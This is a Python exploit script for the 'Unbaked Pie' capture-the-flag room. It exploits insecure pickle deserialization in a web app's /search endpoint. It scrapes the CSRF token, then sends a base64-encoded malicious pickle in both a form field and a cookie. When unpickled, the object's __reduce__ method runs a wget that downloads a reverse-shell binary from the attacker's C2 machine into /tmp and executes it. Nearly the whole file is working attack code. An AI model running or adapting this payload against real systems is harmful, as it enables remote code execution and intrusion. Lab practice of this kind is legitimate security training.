#!/usr/bin/env python3
############################################################
# This script allows an attacker to gain a foothold on the
# target machine in the room "Unbaked Pie" by exploiting
# a Python3 insecure deserialization vulnerability.
#
# This creates an object that gets serialized, base64
# encoded and transmitted to the target where it will get
# base64 decoded, deserialized and the malicious payload
# will get executed.
#
# The malicious payload reaches back to the C2 (attack)
# machine and pulls down a reverse shell, allowing the
# attacker to further enumerate the target and find
# privilege escalation vectors to exploit.
############################################################

import argparse
import base64
import pickle
import re
import requests

ANSI_CLRLN = "\r\x1b[2K\r"
ANSI_RST = "\x1b[0m"
ANSI_GRN = "\x1b[32;1m"
ANSI_RED = "\x1b[31;1m"
ANSI_BLU = "\x1b[34;1m"
ANSI_YLW = "\x1b[33;1m"

############################################################
# An instance of this class will be serialized, base64
# encoded and transmitted to the target.
############################################################
class exploit:
    def __init__(self, targetIP, targetPort, revShell):
        self.tgtIP = targetIP
        self.tgtPort = targetPort
        self.revShell = revShell
        return

    ############################################################
    # This is the piece that will be executed upon reaching
    # the target and being deserialized. 
    ############################################################
    def __reduce__(self):
        import platform
        import subprocess

        if platform.system().lower() == "windows":
            cdir = "C:\\"
            cmd = ("dir",)
        else:
            cdir = "/"
            downloadCMD = f"""wget -O /tmp/x http://{self.tgtIP}:{self.tgtPort}/{self.revShell}"""
            execCMD = """chmod +x /tmp/x;/tmp/x"""
            cmd = (f"""{downloadCMD};{execCMD}""")

        poptup = (0, None, None, None, None, None, True, True, cdir)
        cmdtup = (cmd,) + poptup

        return (subprocess.Popen, cmdtup)

############################################################
# This class has all the functions necessary to, and carrys
# out the, attack.
############################################################
class attacker:
    def __init__(self, targetIP, targetPort, c2IP, c2Port, revShell=None):
        if (revShell is None) or not(isinstance(revShell,str)):
            revShell = "revshell"

        self.__defaultTimeout = 10
        self.__targetIP = targetIP
        self.__targetPort = targetPort
        self.bad_pickle = base64.b64encode(pickle.dumps(exploit(c2IP, c2Port, revShell))).decode("utf-8")
        self.baseURL = f"http://{self.__targetIP}:{self.__targetPort}"
        self.session = requests.session()
        return
    
    def attack_endpoint(self, endpoint):
        endpoint = endpoint.lstrip("/")
        targetURL = f"{self.baseURL}/{endpoint}"
        return

    def find_csrf(self):
        csrftoken = str()
        message = str()
        success = bool()
        tokenpat = "<input.*name=\"csrfmiddlewaretoken\".*>"

        try:
            cpat = re.compile(tokenpat)

            SysMsgNB("grabbing CSRF token")
            resp = self.session.get(self.baseURL)
            if resp.status_code != 200:
                raise ValueError(f"Bad Status Code ({resp.status_code} {resp.reason})")

            matches = cpat.findall(resp.text)
            if len(matches) < 1:
                raise ValueError("Unable to find CSRF token")

            csrftoken = matches[0].split("value=")[1].replace("\"","").replace(">","")

            message = "csrf token pulled"
            success = True
        except Exception as ex:
            csrftoken = str()
            message = str(ex)
            success = False

        return (csrftoken, success, message)

    def send_payload(self):
        message = str()
        success = bool()

        try:
            targetURL = f"{self.baseURL}/search"

            ############################################################
            # Grab CSRF token from webpage
            #
            # Without this, the payload will not be accepted by the
            # vulnerable endpoint.
            ############################################################
            csrftoken, success, message = self.find_csrf()
            if not(success):
                raise ValueError(message)

            cookie_dict = {"csrftoken": csrftoken, "search_cookie": self.bad_pickle}
            data_dict = {"query": self.bad_pickle, "csrfmiddlewaretoken": csrftoken}

            SysMsgNB("sending payload to target")
            resp = self.session.post(targetURL, cookies=cookie_dict, data=data_dict)
            if resp.status_code >= 400:
                raise ValueError(f"Bad Status Code ({resp.status_code} {resp.reason})")

            with open("resp.html","wb") as fptr:
                fptr.write(resp.content)

            message = "payload delivered"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

def SucMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_GRN}+{ANSI_RST}] {msg}")
    return

def ErrMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_RED}-{ANSI_RST}] {msg}")
    return

def InfoMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_BLU}i{ANSI_RST}] {msg}")
    return

def InfoMsgNB(msg):
    print(f"{ANSI_CLRLN}[{ANSI_BLU}i{ANSI_RST}] {msg}", end="")
    return

def SysMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_YLW}*{ANSI_RST}] {msg}")
    return

def SysMsgNB(msg):
    print(f"{ANSI_CLRLN}[{ANSI_YLW}*{ANSI_RST}] {msg}", end="")
    return

def port_type(portno):
    portno = int(portno)

    if (portno < 1) or (portno > 65535):
        raise argparse.ArgumentError("Port must be within range 1 - 65535.")

    return portno

def main():
    
    parser = argparse.ArgumentParser()

    ############################################################
    # Setup required command-line arguments.
    ############################################################
    parser.add_argument("target", help="IP address of target.", type=str)

    ############################################################
    # Setup optional command-line arguments
    ############################################################
    parser.add_argument("-p", "--port", help="Port to connect to target on.", type=port_type, dest="port", default=5003)
    parser.add_argument("-ci", "--c2ip", help="C2 server IP address", type=str, dest="c2ip", default="127.0.0.1")
    parser.add_argument("-cp", "--c2port", help="C2 comms port", type=port_type, dest="c2port", default=9999)

    args = parser.parse_args()

    target = args.target
    port = args.port
    c2IP = args.c2ip
    c2Port = args.c2port

    InfoMsg(f"Target IP: {target}")
    InfoMsg(f"Target Port: {port}")
    InfoMsg(f"C2 IP: {c2IP}")
    InfoMsg(f"C2 Port: {c2Port}")

    try:
        a = attacker(target, port, c2IP, c2Port)
        success, message = a.send_payload()
        if not(success):
            raise ValueError(message)
        SucMsg(f"Payload successfully delivered")
    except Exception as ex:
        ErrMsg(f"{str(ex)}")

    return

if __name__ == "__main__":
    main()

